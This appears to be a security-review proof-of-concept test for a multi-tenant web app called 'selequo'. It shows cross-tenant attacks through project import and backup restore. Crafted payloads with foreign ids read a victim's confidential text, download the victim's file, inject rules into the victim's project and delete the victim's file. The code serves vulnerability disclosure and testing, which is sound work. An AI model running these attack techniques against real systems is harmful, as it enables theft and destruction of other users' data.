import { describe, expect, it } from 'vitest';
import { randomUUID } from 'node:crypto';
import { strToU8, zipSync } from 'fflate';
import { createHash } from 'node:crypto';
import { setup, FIX } from './helpers';

describe('secreview PoC', () => {
  it('cross-tenant read via project import / restore with foreign ids', async () => {
    const env = await setup();
    const v = await env.user('victim@example.com');
    const p = (await v.req('POST', '/projects', { title: 'secret project' })).json;
    const cand = (await v.req('POST', `/projects/${p.id}/candidates`, { name: 'VictimCand', notes: 'internal note' })).json;
    const src = (await v.req('POST', `/projects/${p.id}/sources/text`, { text: '価格: ¥100,000\nTOP-SECRET-CONTRACT-TERMS lorem ipsum', candidateId: cand.id })).json;
    const up = await v.upload(p.id, `${FIX}/raw/pro16-specsheet.pdf`, { candidateId: cand.id, kind: 'pdf' });
    await env.runner.drain();
    const victimFileKey = (await v.req('GET', `/sources/${up.json.id}`)).json.fileKey;
    const vfacts = (await v.req('GET', `/projects/${p.id}/facts`)).json;
    console.log('victim facts', vfacts.length, 'fileKey', victimFileKey);

    // share link exposure of ids
    await v.req('PATCH', '', { sharingEnabled: true });
    const sh = (await v.req('POST', `/projects/${p.id}/shares`, {})).json;
    const token = sh.url.split('/s/')[1];
    const guest = await env.app.inject({ method: 'GET', url: `/api/share/${token}` });
    const gj = guest.json();
    console.log('share exposes candidate row:', JSON.stringify(gj.compare.candidates[0]).slice(0, 300));

    const a = await env.user('attacker@example.com');
    const [pid, cid, fid, fid2, sid] = [randomUUID(), randomUUID(), randomUUID(), randomUUID(), randomUUID()];
    const payload = {
      format: 'selequo-project', schemaVersion: 1,
      project: { id: pid, title: 'evil' },
      candidates: [{ id: cid, project_id: pid, name: 'c' }],
      sources: [{ id: sid, project_id: pid, type: 'pdf', file_key: victimFileKey, mime: 'application/pdf', status: 'ready' }],
      facts: [
        { id: fid, project_id: pid, candidate_id: cid, source_id: src.id, raw_label: 'x', raw_value: 'y', source_range: { type: 'text', start: 0, end: 100000, context: '' }, extracted_by: 'x', review_state: 'confirmed' },
        { id: fid2, project_id: pid, candidate_id: cand.id, source_id: sid, raw_label: 'x', raw_value: 'y', attribute_key: 'price', source_range: { type: 'manual', by: 'x', context: '' }, extracted_by: 'x' },
      ],
      normalization_rules: [{ id: randomUUID(), project_id: p.id, pattern: 'TOP-SECRET-CONTRACT-TERMS lorem ipsum', attribute_key: 'price', active: true }],
    };
    const imp = await a.req('POST', '/projects/import', payload);
    console.log('import', imp.status, JSON.stringify(imp.json).slice(0, 200));
    const afacts = (await a.req('GET', `/projects/${imp.json.projectId}/facts`)).json;
    console.log('attacker facts', afacts.map((f: any) => [f.id, f.sourceTitle, f.candidateId === cand.id]));
    for (const f of afacts) {
      const ev = await a.req('GET', `/facts/${f.id}/evidence`);
      console.log('EVIDENCE', ev.status, 'ctx=', JSON.stringify(ev.json.originalContext), 'srcTitle=', ev.json.source?.title, 'fileUrl=', ev.json.source?.fileUrl, 'siblings=', ev.json.siblings?.map((s: any) => [s.rawValue, s.sourceId]));
      if (ev.json.source?.fileUrl) {
        const dl = await env.app.inject({ method: 'GET', url: ev.json.source.fileUrl });
        console.log('download', dl.statusCode, dl.headers['content-type'], dl.rawPayload.length);
      }
    }
    const asrc = (await a.req('GET', `/projects/${imp.json.projectId}/sources`)).json;
    console.log('attacker sources', asrc.map((s: any) => [s.id, s.fileUrl]));
    // victim-project rule injection
    const rules = await env.db.query(`SELECT workspace_id, project_id FROM normalization_rules WHERE project_id = $1`, [p.id]);
    console.log('rules on victim project', rules, 'victim ws', v.ws);
    // destructive: delete injected source -> deletes victim file
    await a.req('DELETE', `/sources/${asrc[0].id}`);
    const vsrc = (await v.req('GET', `/sources/${up.json.id}`)).json;
    const dl2 = await env.app.inject({ method: 'GET', url: vsrc.fileUrl });
    console.log('victim file after attacker delete:', dl2.statusCode);

    // restore path: any logged in user, no workspace needed
    const r = await env.user('rest@example.com');
    const data = { projects: [{ id: pid, title: 't' }], candidates: [{ id: cid, project_id: pid, name: 'c' }], sources: [{ id: sid, project_id: pid, type: 'text', file_key: null }], facts: [{ id: fid, project_id: pid, candidate_id: cid, source_id: src.id, raw_label: 'x', raw_value: 'y', source_range: { type: 'text', start: 0, end: 100000, context: '' }, extracted_by: 'x' }], users: [{ id: randomUUID(), email: 'victim@example.com', name: 'v' }] };
    const dj = strToU8(JSON.stringify(data));
    const manifest = { format: 'selequo-backup', schemaVersion: 1, appVersion: 'x', createdAt: '', workspaceId: randomUUID(), workspaceName: 'w', counts: {}, checksum: createHash('sha256').update(dj).digest('hex'), files: [] };
    const zip = zipSync({ 'manifest.json': strToU8(JSON.stringify(manifest)), 'data.json': dj });
    const boundary = '----x';
    const raw = Buffer.concat([Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="b.zip"\r\nContent-Type: application/zip\r\n\r\n`), Buffer.from(zip), Buffer.from(`\r\n--${boundary}--\r\n`)]);
    const rr = await r.req('POST', '/api/restore', undefined, { raw, contentType: `multipart/form-data; boundary=${boundary}` });
    console.log('restore', rr.status, JSON.stringify(rr.json));
    const r2 = env.inWs(r, rr.json.workspaceId);
    const projs = (await r2.req('GET', '/projects')).json;
    const rf = (await r2.req('GET', `/projects/${projs[0].id}/facts`)).json;
    const ev = await r2.req('GET', `/facts/${rf[0].id}/evidence`);
    console.log('RESTORE EVIDENCE ctx=', JSON.stringify(ev.json.originalContext));
    await env.close();
  });
});
